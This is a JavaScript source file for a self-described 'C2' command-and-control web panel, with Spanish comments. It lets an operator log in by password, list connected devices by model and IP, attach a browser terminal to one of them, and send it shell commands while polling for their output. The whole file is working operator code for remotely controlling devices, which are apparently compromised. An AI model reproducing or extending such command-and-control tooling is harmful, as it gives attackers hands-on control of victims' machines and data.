const term = new Terminal({
    theme: {
        background: '#0a0e27',
        foreground: '#e0e6ed',
        cursor: '#00bcd4',
        selectionBackground: '#1a237e'
    },
    fontSize: 13,
    fontFamily: 'Courier New, monospace',
    cursorBlink: true,
    cursorStyle: 'block'
});

const fitAddon = new FitAddon.FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById('terminal-container'));
fitAddon.fit();

let authToken = null;
let currentSession = null;
let lastResponseTimestamp = 0;  // Trackear último timestamp para evitar duplicados
let inputBuffer = '';
let inputEnabled = false;
let pollingInterval = null;

function log(msg) {
    const logs = document.getElementById('logs-content');
    const time = new Date().toLocaleTimeString();
    logs.innerHTML += `<div class="log-entry"><span class="log-time">[${time}]</span> ${msg}</div>`;
    logs.scrollTop = logs.scrollHeight;
    console.log('[C2]', msg);
}

function toggleLogs() {
    document.getElementById('logs-panel').classList.toggle('visible');
}

async function doLogin() {
    const password = document.getElementById('password').value;
    try {
        const resp = await fetch('/panel/auth', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({password})
        });
        const data = await resp.json();
        if (data.authenticated) {
            authToken = data.token;
            document.getElementById('login-overlay').style.display = 'none';
            log('Authenticated successfully');
            startPolling();
            updateStatus('online', 'Connected');
        } else {
            alert('Invalid password');
        }
    } catch (e) {
        log('Login error: ' + e.message);
    }
}

function updateStatus(state, text) {
    const indicator = document.getElementById('status-indicator');
    const statusText = document.getElementById('status-text');
    indicator.className = 'status-indicator ' + state;
    statusText.textContent = text;
}

async function startPolling() {
    await refreshSessions();
    pollingInterval = setInterval(async () => {
        await refreshSessions();
        if (currentSession) {
            await pollResponses();
        }
    }, 2000);
}

async function refreshSessions() {
    try {
        const resp = await fetch('/panel/sessions', {
            headers: {'Authorization': 'Bearer ' + authToken}
        });
        const data = await resp.json();
        updateSessionsList(data.sessions || []);
    } catch (e) {
        log('Error fetching sessions: ' + e.message);
    }
}

function updateSessionsList(sessions) {
    const container = document.getElementById('sessions-list');
    if (sessions.length === 0) {
        container.innerHTML = '<p style="opacity: 0.6;">No active sessions</p>';
        return;
    }
    
    container.innerHTML = sessions.map(s => `
        <div class="session-item ${s.id === currentSession ? 'active' : ''}" 
                onclick="attachToSession('${s.id}')"
                title="${s.id}">
            <div class="session-model">${s.model}</div>
            <div class="session-ip">${s.ip} - ${s.status}</div>
            <div class="session-id-small">ID: ${s.id.substring(0, 20)}...</div>
            <div class="session-time">${new Date(s.connected).toLocaleTimeString()}</div>
        </div>
    `).join('');
}

function attachToSession(sessionId) {
    currentSession = sessionId;
    lastResponseTimestamp = 0;  // Reset timestamp para no ver respuestas antiguas
    inputEnabled = true;
    inputBuffer = '';
    term.clear();
    term.writeln('\\x1b[32m[*] Attached to session: ' + sessionId + '\\x1b[0m');
    term.writeln('\\x1b[33m[*] Type commands below\\x1b[0m');
    term.write('\\x1b[32m$\\x1b[0m ');
    refreshSessions();
    log('Attached to session: ' + sessionId);
}

function detachSession() {
    if (currentSession) {
        term.writeln('\\r\\n[*] Detached from session');
        currentSession = null;
        inputEnabled = false;
        refreshSessions();
    }
}

async function pollResponses() {
    if (!currentSession) return;
    try {
        // Solo pedir respuestas más recientes que el último timestamp conocido
        const url = `/panel/responses/${currentSession}?since=${lastResponseTimestamp}&limit=10`;
        const resp = await fetch(url, {
            headers: {'Authorization': 'Bearer ' + authToken}
        });
        const data = await resp.json();
        if (data.responses && data.responses.length > 0) {
            data.responses.forEach(r => {
                if (r.type === 'output') {
                    // Actualizar timestamp máximo
                    if (r.timestamp > lastResponseTimestamp) {
                        lastResponseTimestamp = r.timestamp;
                    }
                    // Limpiar y formatear output para xterm.js
                    let cleanData = r.data
                        .replace(/>\\s*$/gm, '')  // Quitar prompts al final
                        .replace(/\\n\\s*\\n/g, '\\n')  // Quitar líneas vacías múltiples
                        .replace(/\\n/g, '\\r\\n')  // Convertir \\n a \\r\\n para xterm.js
                        .trim();
                    if (cleanData) {
                        // Agregar salto de línea antes del output (separa comando de respuesta)
                        term.write('\\r\\n\\x1b[36m' + cleanData + '\\x1b[0m\\r\\n');
                    }
                }
            });
            // Mostrar prompt después de recibir respuestas
            term.write('\\r\\n\\x1b[32m$\\x1b[0m ');
        }
    } catch (e) {
        log('Error polling responses: ' + e.message);
    }
}

term.onData(e => {
    if (!inputEnabled || !currentSession) {
        if (e === '\\r') {
            term.writeln('\\r\\n[!] No session attached. Select a device first.');
        }
        return;
    }
    
    if (e === '\\r') {
        const cmd = inputBuffer;
        inputBuffer = '';
        // Enviar comando (xterm.js ya mostró el eco)
        sendCommand(cmd);
    } else if (e === '\\u007F') {
        if (inputBuffer.length > 0) {
            inputBuffer = inputBuffer.slice(0, -1);
            term.write('\\b \\b');
        }
    } else {
        inputBuffer += e;
        term.write(e);
    }
});

async function sendCommand(cmd) {
    if (!currentSession) return;
    try {
        await fetch('/panel/command', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer ' + authToken
            },
            body: JSON.stringify({
                session_id: currentSession,
                command: cmd
            })
        });
        log('Command sent: ' + cmd);
    } catch (e) {
        term.writeln('\\x1b[31mError: ' + e.message + '\\x1b[0m');
        log('Error sending command: ' + e.message);
    }
}

function logout() {
    authToken = null;
    currentSession = null;
    if (pollingInterval) clearInterval(pollingInterval);
    document.getElementById('login-overlay').style.display = 'flex';
    updateStatus('offline', 'Disconnected');
    log('Logged out');
}

window.addEventListener('resize', () => fitAddon.fit());
document.getElementById('password').addEventListener('keypress', e => {
    if (e.key === 'Enter') doLogin();
});

log('C2 Panel loaded');